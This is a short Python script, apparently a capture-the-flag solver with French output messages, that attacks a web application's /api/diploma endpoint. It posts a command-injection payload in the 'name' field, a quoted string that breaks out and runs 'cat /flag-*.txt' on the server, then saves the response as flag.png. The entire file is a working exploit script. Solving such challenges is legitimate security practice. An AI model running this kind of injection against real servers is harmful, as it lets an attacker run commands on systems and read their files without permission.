import os
import sys
import argparse
import requests

PAYLOAD = "'; cat /flag-*.txt; echo '"

parser = argparse.ArgumentParser()
parser.add_argument("--target", "-t", required=True, help="URL du serveur")
args = parser.parse_args()

url = f"{args.target}/api/diploma"
resp = requests.post(url, json={
    "name": PAYLOAD,
    "language": "python",
    "answers": {"0": 0, "1": 2},
}, timeout=30)

if resp.status_code != 200:
    print(f"HTTP {resp.status_code}: {resp.text[:200]}")
    sys.exit(1)

out = os.path.join(os.path.dirname(__file__), "flag.png")
with open(out, "wb") as f:
    f.write(resp.content)

print(f"Le flag est dans : {out}")
